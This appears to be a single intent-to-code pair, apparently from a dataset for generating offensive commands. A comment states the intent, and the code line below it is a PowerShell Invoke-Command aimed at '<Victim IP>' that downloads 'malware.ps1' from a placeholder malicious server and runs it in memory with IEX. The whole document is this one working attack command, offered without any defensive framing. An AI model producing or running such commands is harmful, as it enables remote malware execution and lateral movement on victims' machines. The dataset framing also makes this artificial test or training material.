# Natural language intent:
# Run a PowerShell script block on a remote computer to download and execute a script.

Invoke-Command -ComputerName <Victim IP> -ScriptBlock {IEX (New-Object Net.Webclient).DownloadString('http://malicious-server.com/malware.ps1')}
